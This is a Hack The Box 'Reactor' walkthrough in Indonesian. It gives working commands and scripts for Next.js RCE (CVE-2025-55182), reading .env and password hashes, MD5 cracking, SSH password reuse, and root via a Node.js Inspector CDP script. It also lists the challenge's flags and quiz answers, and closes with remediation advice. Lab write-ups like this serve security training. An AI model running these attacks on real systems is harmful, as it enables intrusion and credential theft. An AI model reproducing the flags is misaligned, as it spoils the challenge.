# HTB Reactor — Full Walkthrough (Linux)

> **Box:** Reactor · **Season:** 11 · **OS:** Linux (Ubuntu) · **Difficulty:** Medium
> **Target:** `10.129.131.132`
> **Attack path:** Next.js RCE (CVE-2025-55182 / React2Shell) → SQLite hash crack → SSH password reuse → Node.js Inspector (CDP) privesc

---

## 🏁 Flags

| Flag | Nilai |
|------|-------|
| **user.txt** | `b2d3b9a7d06be2c4ead686ec7d9cc421` |
| **root.txt** | `e68e4ba541d2c6a2a5cc015f87ac8dfe` |

## 🧩 Jawaban Quiz (semua terverifikasi langsung di box)

| # | Pertanyaan | Jawaban |
|---|-----------|---------|
| 1 | Berkas yang menunjukkan **lokasi & jenis** basis data aplikasi | **`.env`** |
| 2 | **Algoritme hashing** penyimpanan password user | **MD5** (unsalted / raw) |
| 3 | Password user **`engineer`** hasil crack | **`reactor1`** |
| 4 | Flag baris perintah Node.js yang mengekspos antarmuka **debugger** | **`--inspect`** |
| 5 | Metode protokol **Inspector** untuk eksekusi JS arbitrer | **`Runtime.evaluate`** |
| 6 | Modul **bawaan Node.js** untuk menjalankan perintah OS | **`child_process`** |

---

## 🧰 Tools yang Dipakai

| Tool | Fungsi |
|------|--------|
| `nmap` | Recon port & service |
| `curl` | Enumerasi web |
| `react2shell-poc` (Python) | Eksploit CVE-2025-55182 |
| `sqlite3` | Dump database SQLite (di target) |
| `john` + `rockyou.txt` | Crack hash MD5 |
| `expect` | Otomasi SSH (login password) |
| `python3` + `websocket-client` | Klien CDP ke Node.js Inspector |

```bash
# Setup awal (Kali)
pip install requests websocket-client
git clone https://github.com/p3ta00/react2shell-poc.git
cd react2shell-poc
```

---

## 🔎 Step 1 — Reconnaissance

### 1.1 Nmap (port + service detection)

```bash
nmap -Pn -sCV -p22,3000 10.129.131.132 -oN /tmp/nmap_reactor.txt
```

Output:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, ...
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> 🧠 **Analisis:** Dua port terbuka — **22/tcp SSH** dan **3000/tcp HTTP**. Header `X-Powered-By: Next.js` + `Vary: RSC, Next-Router-*` menandakan aplikasi **Next.js (App Router / React Server Components)**. Ini petunjuk kunci untuk memilih vektor serangan (RSC Flight protocol).

### 1.2 Enumerasi Web

```bash
curl -sI http://10.129.131.132:3000/
curl -s http://10.129.131.132:3000/ | grep -o '<title>[^<]*</title>'
```

Output:
```
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8

<title>ReactorWatch | Core Monitoring System</title>
```

> 🧠 **Analisis:** Aplikasi = **"ReactorWatch | Core Monitoring System"** (tema monitoring reaktor nuklir). Halaman di-prerender & cache HIT → tidak ada parameter dinamis di root. Fuzzing direktori (gobuster) tidak menemukan rute berguna (rute Next.js tidak ter-list di filesystem). Karena itu, vektor utamanya adalah **kerentanan framework**, bukan path tersembunyi.

### 1.3 Identifikasi Versi Next.js

Aplikasi memakai Next.js **15.0.3** (terkonfirmasi nanti lewat `ps` di target):
```
node 1415 ... next-server (v15.0.3)
```

> 🧠 **Analisis:** Next.js **15.0.3** masuk rentang rentan **CVE-2025-55182 ("React2Shell")** — RCE pra-autentikasi lewat *insecure deserialization* di **React Server Components Flight protocol** (CVSS 10.0). Versi patched: ≥ 15.0.5.

---

## 💥 Step 2 — Foothold: RCE via CVE-2025-55182 (React2Shell)

### 2.1 Prinsip Kerentanan

1. **Entry point:** header `Next-Action` membuat server memproses **Server Action**.
2. **Prototype Pollution:** payload JSON menyuntik properti `then` (`"$1:__proto__:then"`) → server menganggap payload sebagai objek *thenable* (mirip Promise).
3. **Code Injection:** saat "Promise" palsu diselesaikan, objek `_response` diproses; field `_prefix` yang normalnya untuk buffer internal bisa disuntik **JavaScript mentah**.
4. **Sandbox bypass:** `require` diambil dari `global.require || global.process.mainModule.constructor._load`.
5. **Eksekusi & exfil:** kode dijalankan (`execSync`), output dilempar sebagai Error → diserialisasi balik ke HTTP response (error-based exfil, tanpa callback server).

### 2.2 Cek kerentanan & eksekusi

```bash
python3 react2shell-poc.py -t http://10.129.131.132:3000 --check
python3 react2shell-poc.py -t http://10.129.131.132:3000 -c "id"
```

Output:
```
[+] Target is running Next.js
[+] Next.js application detected
[*] Sending error-exfil payload...
[+] Payload delivered to http://10.129.131.132:3000
[*] Response status: 500
[+] Command output extracted from response!
────────────────────────────────────────────────────────────
uid=999(node) gid=988(node) groups=988(node)
────────────────────────────────────────────────────────────
```

> 🧠 **Analisis:** RCE berhasil **tanpa autentikasi**, berjalan sebagai user **`node` (uid 999)**. Ini titik masuk (foothold) ke sistem.

---

## 📂 Step 3 — Enumerasi Aplikasi & Database

### 3.1 Lihat direktori aplikasi

```bash
python3 react2shell-poc.py -t http://10.129.131.132:3000 -c "ls -la /opt/reactor-app"
```

Output:
```
total 76
drwxr-xr-x  5 node node  4096 Dec 28  2025 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28  2025 app
-rw-r--r--  1 node node   276 Dec 28  2025 .env
drwxr-xr-x  7 node node  4096 Dec 28  2025 .next
-rw-r--r--  1 node node   172 Dec 28  2025 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28  2025 node_modules
-rw-r--r--  1 node node   269 Dec 28  2025 package.json
-rw-r--r--  1 node node 29329 Dec 28  2025 package-lock.json
-rw-r-----  1 node node 12288 Dec 28  2025 reactor.db
```

> 🧠 **Analisis:** Ada file **`.env`** (konfigurasi environment) dan **`reactor.db`** (kandidat database). File `.env` biasanya menyimpan kredensial & konfigurasi — target utama.

### 3.2 Baca `.env` ✅ Quiz #1

```bash
python3 react2shell-poc.py -t http://10.129.131.132:3000 -c "cat /opt/reactor-app/.env"
```

Output:
```
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db     ← LOKASI database
DB_TYPE=sqlite3                          ← JENIS database

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

> ✅ **Quiz #1 — Berkas yang menunjukkan lokasi & jenis DB = `.env`**
> File `.env` menunjukkan **lokasi** (`DB_PATH=/opt/reactor-app/reactor.db`) dan **jenis** (`DB_TYPE=sqlite3`) basis data aplikasi.

### 3.3 Konfirmasi jenis file database

```bash
python3 react2shell-poc.py -t http://10.129.131.132:3000 -c "file /opt/reactor-app/reactor.db"
```

Output:
```
/opt/reactor-app/reactor.db: SQLite 3.x database, last written using SQLite version 3045001,
file counter 7, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 7
```

> 🧠 **Analisis:** `reactor.db` adalah **SQLite 3.x**. Karena `sqlite3` tersedia di target, kita bisa query langsung.

### 3.4 Dump tabel `users` ✅ Quiz #2

```bash
python3 react2shell-poc.py -t http://10.129.131.132:3000 \
  -c "sqlite3 /opt/reactor-app/reactor.db 'SELECT * FROM users;'"
```

Output:
```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

> ✅ **Quiz #2 — Algoritme hashing = MD5**
> Nilai hash panjangnya **32 karakter heksadesimal (128-bit)** dan **tanpa salt** → ciri khas **MD5**. Dikonfirmasi `hashid` (MD5) dan berhasil dipecah dengan `john --format=Raw-MD5`.

---

## 🔓 Step 4 — Crack Hash (MD5) ✅ Quiz #3

### 4.1 Siapkan wordlist & file hash

```bash
gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt
printf 'a203b22191d744a4e70ada5c101b17b8\n39d97110eafe2a9a68639812cd271e8e\n' > /tmp/hash.txt
```

### 4.2 Cracking dengan John the Ripper

```bash
john --wordlist=/tmp/rockyou.txt --format=Raw-MD5 /tmp/hash.txt
john --show --format=Raw-MD5 /tmp/hash.txt
```

Output:
```
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
reactor1         (?)
1 password hash cracked, 1 left
--- hasil ---
?:reactor1
```

> ✅ **Quiz #3 — Password `engineer` = `reactor1`**
> Hash `39d97110eafe2a9a68639812cd271e8e` (MD5) = **`reactor1`**. (Hash `admin` belum pecah.)
>
> 🧠 **Analisis:** MD5 tanpa salt sangat lemah → password pendek seperti `reactor1` ada di `rockyou.txt` dan pecah dalam detik.

---

## 🔑 Step 5 — SSH sebagai `engineer` → user.txt

> 💡 Kredensial sering dipakai ulang. Coba `engineer:reactor1` untuk SSH.

Karena `sshpass` tidak tersedia, gunakan `expect`:

```bash
cat > /tmp/ssh_run.exp <<'EOF'
#!/usr/bin/expect -f
set timeout 90
set host [lindex $argv 0]
set port [lindex $argv 1]
set user [lindex $argv 2]
set pass [lindex $argv 3]
set cmd  [lindex $argv 4]
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $port $user@$host
expect {
  -re {[Pp]assword:} { send "$pass\r" }
  -re {yes/no} { send "yes\r"; exp_continue }
  timeout { puts "LOGIN_TIMEOUT"; exit 1 }
}
sleep 1
send "$cmd; echo ===END===\r"
expect { "===END===" { } timeout { puts "CMD_TIMEOUT"; exit 1 } }
send "exit\r"
expect eof
EOF
chmod +x /tmp/ssh_run.exp

/tmp/ssh_run.exp 10.129.131.132 22 engineer reactor1 \
  "id; cat /home/engineer/user.txt"
```

Output:
```
    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    AUTHORIZED PERSONNEL ONLY

engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)

engineer@reactor:~$ cat /home/engineer/user.txt
b2d3b9a7d06be2c4ead686ec7d9cc421
```

> 🏁 **user.txt = `b2d3b9a7d06be2c4ead686ec7d9cc421`**
> 🧠 **Analisis:** Password SSH **sama** dengan password DB (`reactor1`) → *password reuse*. Perhatikan juga `engineer` ada di grup **`lxd`** (vektor privesc alternatif), tapi jalur utama box ini adalah Node.js Inspector.

---

## ⚡ Step 6 — Privilege Escalation: Node.js Inspector

### 6.1 Enumerasi privesc

```bash
/tmp/ssh_run.exp 10.129.131.132 22 engineer reactor1 \
  "ss -tlnp; echo '---'; ps aux | grep -i node | grep -v grep; echo '---'; ls -la /opt"
```

Output:
```
State  Recv-Q Send-Q Local Address:Port  Process
LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*
LISTEN 0      511        127.0.0.1:9229       0.0.0.0:*     ← Node Inspector (localhost)
LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*
LISTEN 0      511                *:3000        *:*
LISTEN 0      4096            [::]:22            [::]:*
---
node        1415  ... next-server (v15.0.3)
root        1417  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js   ← root!
---
total 16
drwxr-xr-x  4 root root 4096 Apr 27 11:26 .
drwxr-xr-x 23 root root 4096 May 20 10:07 ..
drwxr-xr-x  5 node node 4096 Dec 28  2025 reactor-app
drwxr-xr-x  2 root root 4096 Dec 28  2025 uptime-monitor
```

> ✅ **Quiz #4 — Flag debugger Node.js = `--inspect`**
> Proses **root** menjalankan: `node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js`. Flag **`--inspect`** mengekspos antarmuka debugger (Node.js Inspector / Chrome DevTools Protocol) pada port **9229**.
>
> 🧠 **Analisis:** Inspector mendengarkan di `127.0.0.1:9229` (localhost). Kita tidak bisa langsung dari luar, tapi bisa **SSH port-forward** (`-L`) untuk meneruskan port tersebut ke mesin kita.

### 6.2 Buat SSH tunnel ke port inspector

```bash
cat > /tmp/tunnel.exp <<'EOF'
#!/usr/bin/expect -f
set timeout -1
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -N -L 9229:127.0.0.1:9229 -p 22 engineer@10.129.131.132
expect {
  -re {[Pp]assword:} { send "reactor1\r" }
  -re {yes/no} { send "yes\r"; exp_continue }
}
expect eof
EOF
chmod +x /tmp/tunnel.exp
/tmp/tunnel.exp &        # jalankan di background
```

Verifikasi target inspector:
```bash
curl -s http://127.0.0.1:9229/json/list
```

Output:
```json
[ {
  "description": "node.js instance",
  "id": "df22d749-877d-4678-bfb1-bc66a48a01ba",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/df22d749-877d-4678-bfb1-bc66a48a01ba"
} ]
```

> 🧠 **Analisis:** Endpoint `/json/list` memberi **`webSocketDebuggerUrl`** — koneksi WebSocket ke debugger. Lewat inilah kita bicara **Chrome DevTools Protocol (CDP)**.

### 6.3 Eksekusi JS arbitrer via CDP ✅ Quiz #5 & #6

```bash
cat > /tmp/cdp.py <<'EOF'
#!/usr/bin/env python3
import sys, json, urllib.request, websocket
expr = sys.argv[1]
data = json.load(urllib.request.urlopen('http://127.0.0.1:9229/json'))
ws = websocket.create_connection(data[0]['webSocketDebuggerUrl'], timeout=20)
msg = {"id":1, "method":"Runtime.evaluate",
       "params":{"expression":expr, "includeCommandLineAPI":True, "returnByValue":True}}
ws.send(json.dumps(msg))
while True:
    r = json.loads(ws.recv())
    if r.get("id") == 1:
        print("VALUE:", r["result"]["result"].get("value"))
        break
ws.close()
EOF
chmod +x /tmp/cdp.py

python3 /tmp/cdp.py "process.mainModule.require('child_process').execSync('id').toString()"
```

Output:
```
VALUE: uid=0(root) gid=0(root) groups=0(root)
```

> ✅ **Quiz #5 — Metode protokol Inspector = `Runtime.evaluate`**
> Domain `Runtime` pada CDP mengevaluasi JavaScript di runtime V8 proses target. `Runtime.evaluate` menjalankan ekspresi JS arbitrer → RCE.
>
> ✅ **Quiz #6 — Modul bawaan Node.js = `child_process`**
> `require('child_process').execSync(cmd)` menjalankan perintah OS. Karena `require` tidak selalu di global scope inspector, diambil dari `process.mainModule.require(...)`.

---

## 🏴 Step 7 — Ambil root.txt

```bash
python3 /tmp/cdp.py "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()"
```

Output:
```
VALUE: e68e4ba541d2c6a2a5cc015f87ac8dfe
```

> 🏁 **root.txt = `e68e4ba541d2c6a2a5cc015f87ac8dfe`**
> Kita mendapat eksekusi kode sebagai **root** karena proses Node.js yang di-debug dijalankan oleh root.

Bersihkan tunnel:
```bash
pkill -f tunnel.exp
```

---

## ⛓️ Full Attack Chain (ringkas)

```
1. RECON       nmap → 22 (SSH), 3000 (Next.js 15.0.3) "ReactorWatch"
2. VULN        CVE-2025-55182 (React2Shell) — RCE pra-auth di React Server Components
3. FOOTHOLD    react2shell-poc → RCE sebagai node (uid 999)
4. ENUM        /opt/reactor-app/.env + reactor.db (SQLite)          ✅ Quiz .env
5. DUMP        sqlite3 reactor.db 'SELECT * FROM users;' → hash     ✅ Quiz MD5
6. CRACK       john --format=Raw-MD5 --wordlist=rockyou.txt → engineer:reactor1  ✅ Quiz reactor1
7. USER FLAG   ssh engineer@10.129.131.132 (password reuse) → b2d3b9a7d06be2c4ead686ec7d9cc421
8. PRIVESC     root: node --inspect=127.0.0.1:9229 worker.js        ✅ Quiz --inspect
                 ssh -N -L 9229:127.0.0.1:9229 engineer@...
                 → CDP Runtime.evaluate → child_process.execSync    ✅ Quiz Runtime.evaluate & child_process
9. ROOT FLAG   cat /root/root.txt → e68e4ba541d2c6a2a5cc015f87ac8dfe
```

## 🗝️ Credential Chain

| Ditemukan di | Kredensial | Dipakai untuk |
|--------------|-----------|---------------|
| `reactor.db` (tabel `users`) | hash MD5 `engineer` | → dipecah jadi `reactor1` |
| Password `reactor1` | `engineer:reactor1` | Login **SSH** (password reuse) |
| Node Inspector root (9229) | — | **RCE root** via CDP |

---

## 📋 Cheat Sheet Perintah

```bash
# --- Recon ---
nmap -Pn -sCV -p22,3000 10.129.131.132
curl -sI http://10.129.131.132:3000/

# --- Foothold (RCE node) ---
python3 react2shell-poc.py -t http://10.129.131.132:3000 -c "id"

# --- Enumerasi DB ---
python3 react2shell-poc.py -t http://10.129.131.132:3000 -c "cat /opt/reactor-app/.env"
python3 react2shell-poc.py -t http://10.129.131.132:3000 -c "sqlite3 /opt/reactor-app/reactor.db 'SELECT * FROM users;'"

# --- Crack MD5 ---
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt

# --- SSH (expect) ---
/tmp/ssh_run.exp 10.129.131.132 22 engineer reactor1 "id; cat user.txt"

# --- Privesc: Node Inspector ---
/tmp/tunnel.exp &                                       # ssh -N -L 9229:127.0.0.1:9229
curl -s http://127.0.0.1:9229/json/list                 # ambil webSocketDebuggerUrl
python3 /tmp/cdp.py "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()"
```

---

## 🛡️ Remediation (Perbaikan)

| # | Kerentanan | Perbaikan |
|---|-----------|-----------|
| 1 | **CVE-2025-55182 (React2Shell)** — deserialisasi tak aman di Flight protocol RSC | Upgrade **Next.js ≥ 15.0.5** / **React ≥ 19.0.1**; WAF: blokir signature `"$1:__proto__"` & `"$@"` di body multipart |
| 2 | **MD5 tanpa salt** untuk password | Ganti ke **bcrypt / argon2 / scrypt** + salt unik |
| 3 | **Password reuse** (`reactor1` untuk DB & SSH) | Password unik per layanan; gunakan password manager; rotasi berkala |
| 4 | **Node.js Inspector (`--inspect`) di produksi sebagai root** | Jangan jalankan `--inspect` di produksi; bila perlu: bind ke **unix socket** + firewall + jangan jalankan sebagai root |
| 5 | Secrets di `.env` (API key) | Simpan di secret manager; jangan taruh di filesystem aplikasi; batasi permission file |
| 6 | Aplikasi berjalan sebagai user non-root tapi bisa baca `.env`/DB | Prinsip **least privilege**; pisahkan kredensial DB dari proses web |

---

## 📝 Catatan & Pelajaran

- **Next.js App Router** = sinyal kuat untuk memeriksa **CVE-2025-55182 (React2Shell)**; selalu cek versi `next` di `package.json` / `X-Powered-By` / proses `next-server`.
- **Error-based exfil** (`NEXT_REDIRECT` error) memudahkan RCE tanpa callback/reverse shell — cukup baca output di HTTP response.
- **MD5 tanpa salt** masih sering ditemui; selalu siapkan `rockyou.txt` + `john --format=Raw-MD5`.
- **Password reuse** antara database dan SSH sangat umum — coba kredensial yang ditemukan untuk login layanan lain.
- **Node.js `--inspect`** = vektor privesc klasik. Jika prosesnya root, inspector = RCE root. Cek dengan `ss -tlnp` (port 9229) & `ps aux | grep -- --inspect`.
- **Chrome DevTools Protocol**: `Runtime.evaluate` mengeksekusi JS arbitrer; kombinasikan dengan `child_process` untuk perintah OS.

---

*Dokumentasi dibuat: 2026-10-14 · Box: HTB Reactor (Season 11) · Target: 10.129.131.132*
